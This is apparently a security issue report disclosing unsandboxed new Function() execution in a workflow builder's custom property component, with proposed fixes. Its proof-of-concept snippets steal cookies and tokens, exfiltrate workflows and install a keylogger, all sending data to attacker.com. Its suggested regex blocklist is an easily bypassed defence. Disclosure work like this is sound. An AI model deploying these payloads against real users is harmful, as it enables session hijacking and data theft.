---
name: Critical Security Vulnerability
about: CRITICAL: Client-Side Code Execution Without Sandboxing
title: '[CRITICAL] Client-Side RCE via Unsafe Function() in Custom Properties'
labels: security, critical, bug
assignees: ''
---

## 🔴 CRITICAL: Client-Side Code Execution Without Sandboxing

### Description
The frontend component `custom-property.tsx` uses `new Function()` to execute user-provided code directly in the browser without any validation, sanitization, or sandboxing. This allows attackers to execute arbitrary JavaScript in the context of the authenticated user's session.

### Location
- **File**: `workflow/packages/frontend/src/app/builder/piece-properties/custom-property.tsx`
- **Lines**: 29-34
- **Component**: `CustomProperty`

### Vulnerability Details

The vulnerable code:
```typescript
const fn = new Function(
  'params',
  `
  return (${code})(params);
`,
);
// Execute the function with args as the params object
const result = fn({
  containerId,
  value,
  onChange,
  isEmbedded: embedState.isEmbedded,
  projectId: project.id,
  disabled,
});
```

**Security Issues**:
1. Direct execution of user-provided JavaScript using `Function()` constructor
2. No input validation or sanitization
3. Execution occurs in the main browser context with full access to:
   - Browser APIs (localStorage, sessionStorage, cookies)
   - React component state and props
   - Authenticated API requests (using user's session)
   - DOM manipulation
   - All JavaScript globals

### Impact Assessment

- **CVSS Score**: 8.8 (High) - Could be Critical (9.1+) if combined with other vulnerabilities
- **Severity**: High (Critical in certain attack scenarios)
- **Attack Vector**: Network
- **Attack Complexity**: Low
- **Privileges Required**: User account (any authenticated user)
- **User Interaction**: Required (user must interact with custom property)
- **Scope**: Changed (can affect other users' data if combined with other issues)

**Potential Consequences**:
- Session hijacking (steal authentication tokens)
- Unauthorized API calls using victim's credentials
- Data exfiltration (workflows, projects, user data)
- Account takeover
- Cross-site scripting (XSS) if result is rendered
- Privilege escalation if combined with other vulnerabilities

### Proof of Concept

**Scenario 1: Session Token Theft**

Create a custom property with malicious code:
```javascript
(params) => {
  // Steal authentication token from cookies
  const token = document.cookie.match(/auth_token=([^;]+)/)?.[1];
  
  // Exfiltrate to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: token,
      projectId: params.projectId,
      cookies: document.cookie
    })
  });
  
  return params.value;
}
```

**Scenario 2: Unauthorized API Access**

```javascript
(params) => {
  // Make authenticated API calls using user's session
  fetch('/api/v1/flows', {
    credentials: 'include' // Uses user's cookies
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate all workflows
    fetch('https://attacker.com/flows', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
  
  return params.value;
}
```

**Scenario 3: DOM Manipulation and XSS**

```javascript
(params) => {
  // Inject malicious script into page
  const script = document.createElement('script');
  script.textContent = `
    // Keylogger
    document.addEventListener('keydown', (e) => {
      fetch('https://attacker.com/keys', {
        method: 'POST',
        body: e.key
      });
    });
  `;
  document.head.appendChild(script);
  
  return params.value;
}
```

### Affected Components

- Custom property editor in workflow builder
- Any workflow that uses custom properties
- Potentially affects all users who view/edit workflows with malicious custom properties

### Recommended Fix

**Option 1: Input Validation and Sanitization (Immediate)**

```typescript
// Add validation function
const validateCode = (code: string): { valid: boolean; error?: string } => {
  // Block dangerous patterns
  const dangerousPatterns = [
    { pattern: /require\s*\(/, name: 'require()' },
    { pattern: /import\s+/, name: 'import statements' },
    { pattern: /eval\s*\(/, name: 'eval()' },
    { pattern: /Function\s*\(/, name: 'Function() constructor' },
    { pattern: /fetch\s*\(/, name: 'fetch()' },
    { pattern: /XMLHttpRequest/, name: 'XMLHttpRequest' },
    { pattern: /\.cookie/, name: 'cookie access' },
    { pattern: /localStorage/, name: 'localStorage' },
    { pattern: /sessionStorage/, name: 'sessionStorage' },
    { pattern: /document\./, name: 'document manipulation' },
    { pattern: /window\./, name: 'window object access' },
  ];
  
  for (const { pattern, name } of dangerousPatterns) {
    if (pattern.test(code)) {
      return { valid: false, error: `Code contains forbidden pattern: ${name}` };
    }
  }
  
  return { valid: true };
};

// In the component
useEffect(() => {
  if (alreadyRendered.current) return;
  alreadyRendered.current = true;
  
  const validation = validateCode(code);
  if (!validation.valid) {
    console.error('Invalid custom property code:', validation.error);
    onChange(value); // Use default value
    return;
  }
  
  try {
    // ... rest of execution
  } catch (error) {
    console.error('Error executing custom code:', error);
  }
}, []);
```

**Option 2: Sandboxed Execution (Recommended)**

Use a Web Worker or iframe with Content Security Policy:

```typescript
// Use Web Worker for sandboxed execution
const executeInWorker = (code: string, params: any): Promise<any> => {
  return new Promise((resolve, reject) => {
    const workerCode = `
      self.onmessage = function(e) {
        try {
          const { code, params } = e.data;
          const fn = new Function('params', \`return (\${code})(params);\`);
          const result = fn(params);
          self.postMessage({ success: true, result });
        } catch (error) {
          self.postMessage({ success: false, error: error.message });
        }
      };
    `;
    
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    
    worker.onmessage = (e) => {
      if (e.data.success) {
        resolve(e.data.result);
      } else {
        reject(new Error(e.data.error));
      }
      worker.terminate();
    };
    
    worker.postMessage({ code, params });
  });
};
```

**Option 3: Server-Side Execution (Most Secure)**

Move custom property execution to the backend with proper sandboxing:

```typescript
// Frontend: Send code to backend
const result = await fetch('/api/v1/custom-property/execute', {
  method: 'POST',
  body: JSON.stringify({ code, params }),
  credentials: 'include'
}).then(r => r.json());

// Backend: Execute in V8 isolate sandbox
```

### Additional Recommendations

1. **Content Security Policy (CSP)**:
   - Implement strict CSP headers to prevent inline script execution
   - Use nonce-based CSP for legitimate scripts

2. **Input Validation**:
   - Whitelist allowed operations instead of blacklisting
   - Use a safe expression evaluator library

3. **Monitoring**:
   - Log all custom property executions
   - Alert on suspicious patterns

4. **User Education**:
   - Warn users about security implications
   - Provide safe examples

### References

- [OWASP Top 10 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Timeline

- **Discovery Date**: [Current Date]
- **Reported Date**: [Current Date]
- **Expected Fix**: Within 7 business days per bug bounty program

### Additional Notes

This vulnerability is particularly dangerous because:
1. It executes in the authenticated user's context
2. Can be combined with other vulnerabilities for greater impact
3. Difficult to detect without proper monitoring
4. Affects all users who interact with malicious workflows

